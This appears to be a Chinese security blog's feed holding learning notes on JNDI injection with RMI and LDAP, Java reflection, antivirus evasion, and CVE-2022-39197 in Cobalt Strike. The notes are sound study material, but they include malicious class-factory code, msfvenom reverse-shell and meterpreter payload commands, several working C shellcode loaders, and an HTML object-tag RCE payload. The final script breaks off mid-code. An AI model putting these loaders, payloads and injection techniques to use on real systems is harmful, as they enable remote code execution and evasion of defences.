<code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303211229233.png" alt="image-20230321122926066"></p><p>在RMI中调用了InitialContext.lookup()的类有：</p><pre><code>org.springframework.transaction.jta.JtaTransactionManager.readObject()com.sun.rowset.JdbcRowSetImpl.execute()javax.management.remote.rmi.RMIConnector.connect()org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</code></pre><p>在LDAP中调用了InitialContext.lookup()的类有：</p><pre><code>InitialDirContext.lookup()Spring&#39;s LdapTemplate.lookup()LdapTemplate.lookupContext()</code></pre><h4 id="classFactoryLocation参数注入"><a href="#classFactoryLocation参数注入" class="headerlink" title="classFactoryLocation参数注入"></a>classFactoryLocation参数注入</h4><p><code>lookup()</code>参数注入是针对RMI客户端的,<code>classFactoryLocation</code>是针对RMI服务端的,也就是服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入</p><p>例如下面的：</p><p>客户端，lookup参数<strong>不可控</strong></p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Properties;public class Client &#123;    public static void main(String[] args) throws Exception &#123;        Properties env = new Properties();        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;);        Context ctx = new InitialContext(env);        System.out.println(&quot;[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo&quot;);        ctx.lookup(&quot;demo&quot;);    &#125;&#125;</code></pre><p>服务端, <code>url</code><strong>可控</strong></p><pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123;    public static void main(String args[]) throws Exception &#123;        String uri = &quot;http://127.0.0.1:8000&quot;;//        if(args.length == 1) &#123;//            uri = args[0];//        &#125; else &#123;//            uri = &quot;http://127.0.0.1/demo.class&quot;;//        &#125;        System.out.println(&quot;[*]classFactoryLocation: &quot; + uri);        Registry registry = LocateRegistry.createRegistry(1099);        Reference refObj = new Reference(&quot;EvilClass&quot;, &quot;EvilClassFactory&quot;, uri);        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);        System.out.println(&quot;[*]Binding &#39;demo&#39; to &#39;rmi://192.168.43.201:1099/demo&#39;&quot;);        registry.bind(&quot;demo&quot;, refObjWrapper);    &#125;&#125;</code></pre><p>恶意类：</p><pre><code class="java">import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.Hashtable;import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory &#123;    public EvilClassFactory() throws RemoteException &#123;        super();        InputStream inputStream;        try &#123;        //执行命令，返回命令执行结果            inputStream = Runtime.getRuntime().exec(&quot;ipconfig&quot;).getInputStream();            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));            String linestr;            while ((linestr = bufferedReader.readLine()) != null)&#123;                System.out.println(linestr);            &#125;        &#125; catch (IOException e)&#123;            e.printStackTrace();        &#125;    &#125;    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;        return null;    &#125;&#125;</code></pre><p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303211446541.png" alt="image-20230321144627180"></p><h4 id="结合反序列漏洞"><a href="#结合反序列漏洞" class="headerlink" title="结合反序列漏洞"></a>结合反序列漏洞</h4><p>反序列化还没学,有机会补上。根据搜索得到的解释：这种情形其实就是<strong>漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用</strong></p><h2 id="JNDI-LDAP的攻击面"><a href="#JNDI-LDAP的攻击面" class="headerlink" title="JNDI_LDAP的攻击面"></a>JNDI_LDAP的攻击面</h2><h4 id="LDAP-Reference利用"><a href="#LDAP-Reference利用" class="headerlink" title="LDAP+Reference利用"></a>LDAP+Reference利用</h4><p>JNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager ，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被设置为<code>false</code>，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303221520356.png" alt="image-20210801143159130"></p><h2 id="》》》》》玩命加载中"><a href="#》》》》》玩命加载中" class="headerlink" title="》》》》》玩命加载中"></a>》》》》》玩命加载中</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2023/03/16/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/03/16/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><h2 id="什么是java反射？"><a href="#什么是java反射？" class="headerlink" title="什么是java反射？"></a>什么是java反射？</h2><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p><h2 id="Java反射的主要类"><a href="#Java反射的主要类" class="headerlink" title="Java反射的主要类"></a>Java反射的主要类</h2><ul><li>类：java.lang.Class;</li><li>构造器：java.lang.reflect.Constructor;</li><li>字段：java.lang.reflect.Field;</li><li>方法：java.lang.reflect.Method;</li><li>修饰符：java.lang.reflect.Modifier;</li></ul><h2 id="Java如何获取一个类"><a href="#Java如何获取一个类" class="headerlink" title="Java如何获取一个类"></a>Java如何获取一个类</h2><p>JVM为每个加载的class创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息；因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息(下面用<code>String</code>类举例)</p><ul><li>直接通过一个<code>class</code>的静态变量<code>class</code>获取</li></ul><pre><code>Class cls = String.class;</code></pre><ul><li>通过该实例变量提供的<code>getClass()</code>方法获取</li></ul><pre><code>String s = &quot;hello&quot;;Class cls = s.getClass();</code></pre><ul><li>知道一个<code>class</code>的<em>完整类名</em>，可以通过静态方法<code>Class.forName()</code>获取</li></ul><pre><code>Class cls = Class.forName(&quot;java.lang.String&quot;);</code></pre><p>上面3种方法获取的结果都是<code>class java.lang.String</code></p><h2 id="一个简单的反射示例"><a href="#一个简单的反射示例" class="headerlink" title="一个简单的反射示例"></a>一个简单的反射示例</h2><p>先简单写个类</p><pre><code class="java">class MyClass &#123;    private int privateField;    public String publicField;    public MyClass() &#123;&#125;    public void doSomething() &#123;&#125;    &#125;</code></pre><pre><code class="java">MyClass obj = new MyClass(); //创建一个对象Class c = obj.getClass(); //获取类名Method[] methods = c.getDeclaredMethods(); //获取全部方法Constructor[] constructors = c.getDeclaredConstructors(); //获取类中声明的全部构造函数       Field[] fields = c.getDeclaredFields(); // 获取类的字段</code></pre><p>完整代码</p><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) &#123;        MyClass obj = new MyClass();        Class c = obj.getClass();        System.out.println(&quot;类名：&quot;+c);        Method[] methods = c.getDeclaredMethods();        for (Method method : methods) &#123;            System.out.println(&quot;方法的名称：&quot; + method.getName());        &#125;        Constructor[] constructors = c.getDeclaredConstructors();        System.out.println(&quot;构造函数的数量：&quot; + constructors.length);        for(Constructor con:constructors)        &#123;            System.out.println(&quot;构造函数的名称：&quot; + con.getName());        &#125;        // 获取类的字段        Field[] fields = c.getDeclaredFields();        for (Field field : fields) &#123;            System.out.println(&quot;字段的名称：&quot; + field.getName());        &#125;    &#125;&#125;class MyClass &#123;    private int privateField;    public String publicField;    public MyClass() &#123;&#125;//构造函数    public void doSomething() &#123;&#125;&#125;</code></pre><p>运行结果：</p><pre><code>类名：class MyClass方法的名称：doSomething构造函数的数量：1构造函数名称：MyClass字段的名称：privateField字段的名称：publicField</code></pre><h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><p>上面的反射示例中，使用了<code>getDeclaredFields()</code>方法获取字段，还有一个方法<code>getFields()</code></p><p>两者的区别：</p><p>getDeclaredFields()：获得某个类的所有声明的字段，即包括public、private和proteced，但是不包括父类的申明字段。</p><p>getFields()：获得某个类的所有的公共（public）的字段，包括父类中的字段。</p><p>例如：</p><p>使用：getDeclaredFields()</p><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) &#123;       Class cls = String.class;       System.out.println(&quot;类名：&quot;+cls);       Field[] fields = cls.getDeclaredFields();       for (Field field:fields)&#123;           System.out.println(&quot;字段名: &quot;+field);       &#125;    &#125;&#125;</code></pre><p>输出：</p><pre><code>类名：class java.lang.String字段名: private final byte[] java.lang.String.value字段名: private final byte java.lang.String.coder字段名: private int java.lang.String.hash字段名: private boolean java.lang.String.hashIsZero字段名: private static final long java.lang.String.serialVersionUID字段名: static final boolean java.lang.String.COMPACT_STRINGS字段名: private static final java.io.ObjectStreamField[] java.lang.String.serialPersistentFields字段名: private static final char java.lang.String.REPL字段名: public static final java.util.Comparator java.lang.String.CASE_INSENSITIVE_ORDER字段名: static final byte java.lang.String.LATIN1字段名: static final byte java.lang.String.UTF16</code></pre><p>使用：getFields()</p><pre><code>import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) &#123;       Class cls = String.class;       System.out.println(&quot;类名：&quot;+cls);        Field[] fields = cls.getFields();        for (Field field:fields)&#123;            System.out.println(&quot;字段名: &quot;+field);        &#125;    &#125;&#125;</code></pre><p>输出：</p><pre><code>类名：class java.lang.String字段名: public static final java.util.Comparator java.lang.String.CASE_INSENSITIVE_ORDER</code></pre><p>可以通过getDeclaredFields()或getFields()获取指定的字段并修改值</p><p>例如：</p><p>先创建一个类StuInfo并继承PersonInfo：</p><pre><code class="java">class StuInfo extends PersonInfo&#123;    public int age;    private int money;    @Override    public String toString() &#123;        return &quot;StuInfo&#123;&quot; +                &quot;name=&quot; + name +                &quot;, money=&quot; + money +                &#39;&#125;&#39;;    &#125;&#125;class PersonInfo&#123;    public String name = &quot;TOM&quot;;&#125;</code></pre><p>反射部分代码：</p><pre><code class="java">public class Reflectdemo &#123;    public static void main(String[] args) throws Exception &#123;        Class stiClass = StuInfo.class;        // 获取public字段&quot;age&quot;:        System.out.println(stiClass.getField(&quot;age&quot;));        // 获取继承的public字段&quot;name&quot;:        System.out.println(stiClass.getField(&quot;name&quot;));        // 获取private字段&quot;grade&quot;:        System.out.println(stiClass.getDeclaredField(&quot;money&quot;));        // 获得值,name.get里面参数需要该类对象，而不是.class        Field name = stiClass.getField(&quot;name&quot;);        System.out.println(name.get(stiClass.newInstance()));  //获取name的值，这里是TOM        // 设置值        StuInfo stuInfo = new StuInfo();        Field money = stiClass.getDeclaredField(&quot;money&quot;);        money.setAccessible(true);        money.set(stuInfo,1000);        System.out.println(stuInfo);    &#125;&#125;</code></pre><p>输出结果：</p><pre><code>public int StuInfo.agepublic java.lang.String PersonInfo.nameprivate int StuInfo.moneyTOMStuInfo&#123;name=TOM, money=1000&#125;</code></pre><h2 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h2><p>有一下几种方式可以获取：</p><ul><li><p><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</p></li><li><p><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</p></li><li><p><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</p></li></ul><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args)  &#123;        String  s = &quot;T0dis&quot;;        Class cls = s.getClass();        System.out.println(cls);        Method[] m2 = cls.getMethods();        System.out.println(m2.length);//输出个数90    &#125;&#125;</code></pre><ul><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li></ul><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args)  &#123;        String  s = &quot;T0dis&quot;;        Class cls = s.getClass();        System.out.println(cls);        Method[] m1 = cls.getDeclaredMethods();        System.out.println(m1.length);//输出个数141    &#125;&#125;</code></pre><p>简单来通过反射来使用<code>substring</code>方法:</p><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) throws Exception &#123;        Class stringClass = String.class;        Method substringMethod = stringClass.getMethod(&quot;substring&quot;, int.class, int.class);        String str = &quot;Hello, World!&quot;;        Object result = substringMethod.invoke(str, 7, 12);        String subStr = (String) result;        System.out.println(subStr); // 输出 World    &#125;&#125;</code></pre><p>这里的示例中获取的是有参数方法的Method对象，若是获取无参数方法的Method对象，例如：</p><pre><code class="java">Class stringClass = String.class;Method lengthMethod = stringClass.getMethod(&quot;length&quot;);</code></pre><p><code>getDeclaredMethod</code>也是类似的用法，这里就不介绍了</p><p><strong>注意</strong>：如果调用的方法是静态方法。那么invoke<code>方法传入的第一个参数永远为</code>null</p><pre><code>// 获取Integer.parseInt(String)方法，参数为String:Method m = Integer.class.getMethod(&quot;parseInt&quot;, String.class);// 调用该静态方法并获取结果:Integer n = (Integer) m.invoke(null, &quot;23333&quot;);System.out.println(n);</code></pre><h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h2><p>构造方法（Constructor）是一种特殊的方法，用于在对象创建时初始化对象的成员变量。它的名称必须与类名相同，没有返回类型（包括 void），可以有参数，也可以没有参数。当创建一个对象时，构造方法会自动调用，为对象的成员变量赋初值。如果没有定义构造方法，Java会默认提供一个无参构造方法。如果定义了构造方法，Java不会再提供默认的构造方法。</p><p>通过Class实例获取Constructor的方法有下面几种：</p><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li><li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li></ul><p>调用非<code>public</code>的<code>Constructor</code>时，必须首先通过<code>setAccessible(true)</code>设置允许访问。<code>setAccessible(true)</code>可能会失败。</p><p>示例：</p><p>简单的写个类：</p><pre><code class="java">class Person &#123;    public String name;    public int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    private Person(String name) &#123;        this.name = name;    &#125;    public void sayHello() &#123;        System.out.println(&quot;Hello, my name is &quot; + name + &quot;, I&#39;m &quot; + age + &quot; years old.&quot;);    &#125;&#125;</code></pre><p>获取Person类的Class对象</p><pre><code class="java"> Class&lt;?&gt; clazz = Person.class;//这里的&lt;?&gt;是Java中的泛型语法，表示&quot;未知类型&quot;。在这个例子中，它表示我们不知道要使用的类的具体类型，但我们知道它是一个类。这种语法通常用于在编译时检查类型安全性，并在运行时使用具体类型</code></pre><p>通过下面代码可以看出这几个方法的区别</p><p>代码中<code>getModifiers()</code> 方法是 Java 反射 API 的一部分，它用于获取指定构造函数的修饰符。修饰符是一个整数值，用于描述类，字段，方法或构造函数的访问级别等信息。</p><pre><code class="java">// 获取所有公有构造方法Constructor&lt;?&gt;[] constructors = clazz.getConstructors();System.out.println(&quot;getConstructors():&quot;);Arrays.stream(constructors).forEach(constructor -&gt; &#123;      System.out.println(constructor.getName() + &quot;(&quot; + Modifier.toString(constructor.getModifiers()) + &quot;)&quot;);   &#125;); // 获取所有构造方法（包括私有构造方法）Constructor&lt;?&gt;[] declaredConstructors = clazz.getDeclaredConstructors();System.out.println(&quot;\ngetDeclaredConstructors():&quot;);Arrays.stream(declaredConstructors).forEach(declaredConstructor -&gt; &#123;      System.out.println(declaredConstructor.getName() + &quot;(&quot; + Modifier.toString(declaredConstructor.getModifiers()) + &quot;)&quot;);    &#125;);// 获取指定公有构造方法Constructor&lt;?&gt; constructor1 = clazz.getConstructor(String.class, int.class);System.out.println(&quot;\ngetConstructor():&quot;);System.out.println(constructor1.getName() + &quot;(&quot; + Modifier.toString(constructor1.getModifiers()) + &quot;)&quot;);// 获取指定构造方法（包括私有构造方法）Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructor(String.class);System.out.println(&quot;\ngetDeclaredConstructor():&quot;);System.out.println(constructor2.getName() + &quot;(&quot; + Modifier.toString(constructor2.getModifiers()) + &quot;)&quot;);</code></pre><p>输出结果：</p><pre><code>getConstructors():Person(public)getDeclaredConstructors():Person(public)Person(private)getConstructor():Person(public)getDeclaredConstructor():Person(private)</code></pre><h2 id="如何通过反射执行命令"><a href="#如何通过反射执行命令" class="headerlink" title="如何通过反射执行命令"></a>如何通过反射执行命令</h2><p>简单的弹个计算机</p><pre><code>import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Class cls = Class.forName(&quot;java.lang.Runtime&quot;);        Method EXEC = cls.getMethod(&quot;exec&quot;,String.class);        String comm = &quot;calc&quot;;        Process p = (Process) EXEC.invoke(Runtime.getRuntime(), comm);    &#125;&#125;</code></pre><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>还有很多反射的知识没写，遇到再补充吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀学习</title>
      <link href="/2023/02/17/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/02/17/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀学习"><a href="#免杀学习" class="headerlink" title="免杀学习"></a>免杀学习</h1><h2 id="什么是shellcode？"><a href="#什么是shellcode？" class="headerlink" title="什么是shellcode？"></a>什么是shellcode？</h2><p>Shellcode是一种恶意代码，它试图劫持计算机内存中正在运行的程序的正常流程。然后它会重定向流程，以便执行恶意代码，而不是正常程序，从而为攻击者提供 shell 或实际访问权限。这些通常是低级编程代码形式的信标或有效载荷或结合漏洞利用的机器代码。漏洞利用是成功利用漏洞的低级或本机代码片段。</p><p>例如：</p><pre><code class="shell">\xeb\x54\x31\xf6\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e</code></pre><h2 id="如何生成shellcode"><a href="#如何生成shellcode" class="headerlink" title="如何生成shellcode?"></a>如何生成shellcode?</h2><p>获取shellcode的方法有很多，其中以下两种最常用</p><ol><li>msfvenom</li></ol><p>例如：</p><pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;SERVER&gt; LPORT=&lt;PORT&gt; -a x86 -f cmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;SERVER&gt; LPORT=&lt;PORT&gt; -f rawmsfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f dllmsfvenom -p windows/exec cmd=calc.exe -f c.....</code></pre><ol start="2"><li>cobaltstrike</li></ol><p><img src="https://image.3001.net/images/20200520/1589979628_5ec529ecaba7a.png!small" alt="img"></p><ol start="3"><li>and so on…..</li></ol><h2 id="如何加载shellcode"><a href="#如何加载shellcode" class="headerlink" title="如何加载shellcode"></a>如何加载shellcode</h2><p>用代码写个shellcode加载器，可以用C、C++ 、GO、python等语言进行编写</p><p>加载器一般分为几步：</p><ul><li>分配内存</li><li>将shellcode移动到内存中</li><li>执行shellcode</li></ul><p>下面是利用C语言编写的加载器例子,经过测试这些都是能成功上线的：</p><ol><li>动态申请内存:</li></ol><pre><code class="c">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)//这个是为了执行exe时不显示cmd窗口typedef void (_stdcall *CODE)();unsigned char shellcode[] =&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52.........&quot;;void main()&#123;    PVOID p = NULL;    p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//申请内存    if (p == NULL)    &#123;        return;    &#125;    memcpy(p, shellcode, sizeof(shellcode));//将shellcode移动到内存中        CODE code = (CODE)p;    code();//执行shellcode&#125;</code></pre><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230220111634039.png" alt="image-20230220111634039"></p><p>2.强制类型转换为函数指针</p><pre><code class="c">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)unsigned char shellcode[] =&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52........&quot;;void main()&#123;   ((void(WINAPI*)(void))&amp;shellcode)();&#125;</code></pre><ol start="3"><li>嵌入式汇编执行shellcode</li></ol><pre><code class="c">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker, &quot;/section:.data,RWE&quot;) ////这句话是关键，设置数据段为可执行unsigned char shellcode[] =&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52........&quot;;void main()&#123;        __asm    &#123;                mov eax, offset shellcode        jmp eax    &#125;&#125;</code></pre><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230220111911749.png" alt="image-20230220111911749"></p><p>添加伪指令版本：</p><pre><code class="c">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker, &quot;/section:.data,RWE&quot;) //设置data段可读可写可执行的权限unsigned char shellcode[] =&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52........&quot;;void main()&#123;        __asm    &#123;                mov eax, offset shellcode        _emit 0xFF          _emit 0xE0    &#125;&#125;</code></pre><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230220112038271.png" alt="image-20230220112038271"></p><p>其他语言版本的加载器就不一一列举了，思想应该都差不多吧</p><h2 id="对shellcode进行加密"><a href="#对shellcode进行加密" class="headerlink" title="对shellcode进行加密"></a>对shellcode进行加密</h2><p>shellcode加密有异或加密、base64加密、aes加密、自定义加解密等几种。异或加密和base64加密也就是最简单的加密，也就是最容易被查杀的两种加密，这里就不考虑了，看看其他的。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-39197学习笔记</title>
      <link href="/2022/10/30/CVE-2022-39197%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/30/CVE-2022-39197%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-39197学习笔记"><a href="#CVE-2022-39197学习笔记" class="headerlink" title="CVE-2022-39197学习笔记"></a>CVE-2022-39197学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞存在于Cobalt Strike的Beacon软件中，一个 XSS漏洞，允许远程攻击者在 Cobalt Strike 团队服务器上执行 HTML，并实现rce。</p><h2 id="漏洞起点"><a href="#漏洞起点" class="headerlink" title="漏洞起点"></a>漏洞起点</h2><p>Cobalt Strike 接口建立在 Java Swing 框架之上。该框架为开发人员提供了用于 Java 程序的图形用户界面。</p><p><a href="https://docs.oracle.com/javase/tutorial/uiswing/components/html.html">根据官方文档</a> 所描述，在开头插入<code>&lt;html&gt;</code>标签后续的内容就会被格式化为html文档进行解析，也就是说支持html标签</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011228452.png" alt="image-20221030214448317"></p><p>测试demo:</p><pre><code class="java">import javax.swing.*;public class test &#123;    private static void createAndShowGUI() &#123;        JFrame.setDefaultLookAndFeelDecorated(true);        JFrame frame = new JFrame(&quot;asdfas&quot;);        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);        JLabel label = new JLabel(&quot;&lt;html&gt;&lt;img src=xxxxx&gt;&lt;h1&gt;Hello world&lt;/h1&gt;&quot;);        frame.getContentPane().add(label);        frame.pack();        frame.setVisible(true);    &#125;    public static void main(String[] args) &#123;        javax.swing.SwingUtilities.invokeLater(new Runnable() &#123;            public void run() &#123;                createAndShowGUI();            &#125;        &#125;);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011228540.png" alt="image-20221030214752682"></p><p>从demo运行结果可以看出html代码被解析执行，这就是整个漏洞的关键点，也是起点</p><h2 id="大佬文章指引"><a href="#大佬文章指引" class="headerlink" title="大佬文章指引"></a>大佬文章指引</h2><p>根据<a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098978&idx=1&sn=d511d5a674d84eeaf262c8e389ae0403&chksm=803c696bb74be07d8ef8e473b11ffe4dce57b58ccf82e8615ab15d9ba6bba9263360c01276a8&mpshare=1&scene=23&srcid=1012cGc5X3pyXr5VpF2LMf7Y&sharer_sharetime=1665577816700&sharer_shareid=685f4dccaa04150832e24b9e6499e6cf#rd">漂亮鼠大佬文章</a> 分析的，&lt;object 标签能够实现rce，payload大概长这个样</p><pre><code class="html">&lt;html&gt; &lt;object classid=&quot;A&quot;&gt; &lt;param name=&quot;my_name&quot; value=&quot;Rio&quot;&gt;&lt;/object&gt;</code></pre><p>解析器将尝试创建A类的实例，检查该类是否是<code>java.awt.Component</code>的子类，并为<code>my_name</code> 参数调用 <code>setXXXX </code>方法。</p><p>总的来说要满足以下条件</p><ol><li>classid传入需要实例化的类，类必须继承与Component</li><li>必须有无参构造方法，貌似是因为newinstant是调用的无参构造方法</li><li>必须存在一个setXXX方法的XXX属性</li><li>setXXX方法的传参数必须是接受一个string类型的参数</li></ol><h2 id="寻找rce链子"><a href="#寻找rce链子" class="headerlink" title="寻找rce链子"></a>寻找rce链子</h2><p>手动寻找满足以上标准的类绝非易事，利用java反射，能够快速找出满足条件的所有类</p><p>ps:  java几乎0基础，花了好久才整出这个脚本</p><pre><code class="java">import java.awt.*;import java.io.File;import java.io.IOException;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;import java.util.Enumeration;import java.util.jar.JarEntry;import java.util.jar.JarFile;public class load_jar &#123;    public static void getJarName(String jarFile) throws Exception &#123;        int flag=1;        int flag2 = 0;        try&#123;            //通过将给定路径名字符串转换为抽象路径名来创建一个新File实例            File f = new File(jarFile);            URL url1 = f.toURI().toURL();            URLClassLoader myClassLoader = new URLClassLoader(new URL[]&#123;url1&#125;,Thread.currentThread().getContextClassLoader());            //通过jarFile和JarEntry得到所有的类            JarFile jar = new JarFile(jarFile);            //返回zip文件条目的枚举            Enumeration&lt;JarEntry&gt; enumFiles = jar.entries();            JarEntry entry;            while(enumFiles.hasMoreElements())            &#123;                entry = (JarEntry)enumFiles.nextElement();                if(entry.getName().indexOf(&quot;META-INF&quot;)&lt;0)                &#123;                    String classFullName = entry.getName();                    if(classFullName.endsWith(&quot;.class&quot;))                    &#123;                        String className = classFullName.substring(0,classFullName.length()-6).replace(&quot;/&quot;, &quot;.&quot;);                        try&#123;                            flag+=1;                            Class&lt;?&gt; clazz = myClassLoader.loadClass(className);                            Method[] methods = clazz.getMethods();                            for (Method method : methods)                            &#123;                                String methodName = method.getName();                                if (methodName.contains(&quot;set&quot;))&#123;                                    Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();                                    if (parameterTypes.length == 1)&#123;                                        for (Class&lt;?&gt; clas : parameterTypes)                                        &#123;                                            String parameterName = clas.getSimpleName();                                            if (parameterName.contains(&quot;String&quot;))&#123;                                                try &#123;                                                    Object o = clazz.newInstance();                                                    if (o instanceof Component)&#123;                                                        System.out.println(&quot;-------------&quot;+flag2+&quot;-------------&quot;);                                                        flag2 = flag2 + 1;                                                        System.out.println(&quot;classname:&quot; + className);                                                        System.out.println(&quot;methodname:&quot; + methodName);                                                        System.out.println(&quot;parameterName:&quot; + parameterName);                                       